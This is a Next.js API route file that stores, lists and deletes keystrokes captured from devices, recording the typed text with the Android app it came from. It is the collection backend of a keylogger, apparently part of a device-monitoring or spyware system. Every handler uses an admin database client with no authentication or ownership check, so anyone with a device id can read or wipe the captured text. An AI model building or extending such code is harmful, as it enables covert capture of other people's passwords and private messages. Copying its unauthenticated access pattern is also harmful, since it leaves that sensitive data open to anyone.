// app/api/devices/[id]/data/keystrokes/route.ts
import { NextResponse } from "next/server";
import { createAdminClient } from "@/lib/supabase/admin";

export async function GET(
  request: Request,
  { params }: { params: { id: string } }
) {
  try {
    const admin = createAdminClient();
    const { data: keystrokes, error } = await admin
      .from("device_keystrokes")
      .select("*")
      .eq("device_id", params.id)
      .order("created_at", { ascending: false })
      .limit(100);

    if (error) throw error;
    return NextResponse.json({ keystrokes: keystrokes || [] });
  } catch (err: any) {
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}

export async function POST(
  request: Request,
  { params }: { params: { id: string } }
) {
  try {
    const body = await request.json();
    const { package_name, app_name, text } = body;

    if (!text || text.trim().length === 0) {
      return NextResponse.json({ error: "Empty keystroke text" }, { status: 400 });
    }

    const admin = createAdminClient();
    const { data, error } = await admin
      .from("device_keystrokes")
      .insert({
        device_id: params.id,
        package_name: package_name || "",
        app_name: app_name || package_name || "Unknown App",
        text: text.trim(),
      })
      .select()
      .single();

    if (error) throw error;
    return NextResponse.json({ success: true, keystroke: data });
  } catch (err: any) {
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}

export async function DELETE(
  request: Request,
  { params }: { params: { id: string } }
) {
  try {
    const admin = createAdminClient();
    const { error } = await admin
      .from("device_keystrokes")
      .delete()
      .eq("device_id", params.id);

    if (error) throw error;
    return NextResponse.json({ success: true });
  } catch (err: any) {
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}
